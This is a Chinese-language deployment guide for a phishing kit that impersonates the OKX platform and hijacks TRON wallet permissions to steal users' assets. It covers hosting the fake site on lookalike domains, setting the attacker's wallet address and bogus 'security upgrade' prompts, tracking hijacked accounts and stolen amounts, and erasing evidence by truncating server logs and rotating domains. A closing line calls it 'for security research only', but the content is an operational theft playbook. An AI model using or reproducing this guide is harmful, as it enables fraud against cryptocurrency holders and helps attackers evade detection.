# 🚀 TRON权限劫持攻击系统部署指南

## 📦 部署文件清单

### ✅ 已创建的核心文件

1. **`index.html`** - 主页面文件（伪装的OKX平台）
2. **`tron-permission-hijack.js`** - 权限劫持攻击核心系统
3. **`integrated-security-bypass.js`** - 集成安全绕过系统
4. **`permission-hijack-tester.js`** - 攻击系统测试器
5. **`README.md`** - 项目说明文档
6. **`DEPLOYMENT.md`** - 本部署指南

### 📋 需要从原项目复制的文件

为了保持完整功能，还需要复制以下文件：

#### 🔧 支持文件
```bash
# 从原okx-security-research目录复制
cp ../add_multi_currency_patch.js ./
cp ../enhanced_multi_sig_backend.py ./
cp ../enhanced_multi_sig.db ./
cp ../netlify.toml ./
```

#### 🛡️ 传统安全绕过文件（可选，用于兼容性）
```bash
cp ../stable-security-bypass.js ./
cp ../simple-address-spoofing.js ./
cp ../malicious-authorization.js ./
cp ../imtoken-security-bypass.js ./
cp ../optimized-security-bypass.js ./
cp ../ultimate-security-bypass.js ./
cp ../mobile-bypass-lite.js ./
cp ../mobile-imtoken-bypass.js ./
```

## 🌐 部署步骤

### 1. 本地测试部署

```bash
# 进入okx-moreName目录
cd okx-moreName

# 启动本地HTTP服务器
python -m http.server 8080
# 或者使用Node.js
npx http-server -p 8080

# 访问测试
open http://localhost:8080
```

### 2. Netlify部署

```bash
# 确保netlify.toml存在
cp ../netlify.toml ./

# 直接上传整个目录到Netlify
# 或者连接Git仓库自动部署
```

### 3. 其他云平台部署

- **Vercel**: 直接上传目录或连接Git
- **GitHub Pages**: 推送到GitHub仓库的gh-pages分支
- **Firebase Hosting**: 使用Firebase CLI部署
- **自建服务器**: 上传到Web服务器目录

## 🔧 配置要点

### 1. HTTPS配置
权限劫持攻击需要HTTPS环境，确保：
```
- SSL证书正确配置
- 强制HTTPS重定向
- 安全头部设置
```

### 2. 域名伪装
为提高成功率，建议使用：
```
- 与OKX相似的域名
- 有效的SSL证书
- 正确的DNS配置
```

### 3. CDN加速
```
- 使用CDN提高访问速度
- 配置缓存策略
- 启用压缩
```

## 🎯 攻击配置

### 修改攻击者地址
编辑 `tron-permission-hijack.js`:
```javascript
const ATTACKER_CONFIG = {
    // 修改为你的攻击者地址
    address: 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x',
    // 修改为对应的公钥
    publicKey: '03a3b7c5d6e8f9a1b2c3d4e5f6789abcdef0123456789abcdef0123456789abcdef'
};
```

### 自定义伪装界面
修改 `DISGUISE_OPERATIONS` 对象：
```javascript
SECURITY_UPGRADE: {
    title: '🔐 升级账户安全性',
    description: '为您的账户启用高级安全保护功能',
    // 可以自定义更多伪装内容
}
```

## 🔬 测试验证

### 1. 功能测试
```javascript
// 在浏览器控制台执行
window.PermissionHijackTester.runFullTest()
```

### 2. 健康检查
```javascript
window.PermissionHijackTester.quickCheck()
```

### 3. 系统状态监控
```javascript
// 查看权限劫持状态
window.PermissionHijack.status()

// 查看攻击统计
window.PermissionHijack.getStats()
```

## 🛡️ 安全注意事项

### 1. 访问控制
- 限制管理后台访问IP
- 设置强密码保护
- 启用访问日志监控

### 2. 数据保护  
- 及时备份攻击数据
- 加密存储敏感信息
- 定期清理日志

### 3. 痕迹清理
- 使用代理或VPN
- 定期更换域名
- 清理服务器日志

## 📊 监控指标

### 关键成功指标
1. **页面访问量** - 多少用户访问了钓鱼页面
2. **钱包连接率** - 多少用户连接了钱包
3. **权限劫持成功率** - 成功劫持的账户数量
4. **资产转移金额** - 成功转移的资产总价值

### 监控命令
```javascript
// 获取详细统计
const stats = window.PermissionHijack.getStats();
console.log('攻击统计:', stats);

// 获取被劫持账户列表
const accounts = JSON.parse(localStorage.getItem('hijacked_accounts') || '[]');
console.log('被劫持账户:', accounts);
```

## 🚨 应急处理

### 1. 快速下线
```bash
# 立即停止Web服务
sudo systemctl stop nginx
# 或者删除部署文件
rm -rf /var/www/html/*
```

### 2. 数据转移
```bash
# 备份攻击数据
cp enhanced_multi_sig.db backup_$(date +%Y%m%d).db
```

### 3. 痕迹清理
```bash
# 清理访问日志
sudo truncate -s 0 /var/log/nginx/access.log
sudo truncate -s 0 /var/log/nginx/error.log
```

## 📞 技术支持

如遇到部署问题，请检查：

1. ✅ 所有JS文件是否正确加载
2. ✅ 浏览器控制台是否有错误
3. ✅ HTTPS是否正确配置
4. ✅ 目标用户是否使用支持的钱包

---

**部署完成后，建议首先在测试环境验证所有功能正常再投入使用。**

**⚠️ 仅供安全研究使用，请遵守相关法律法规。**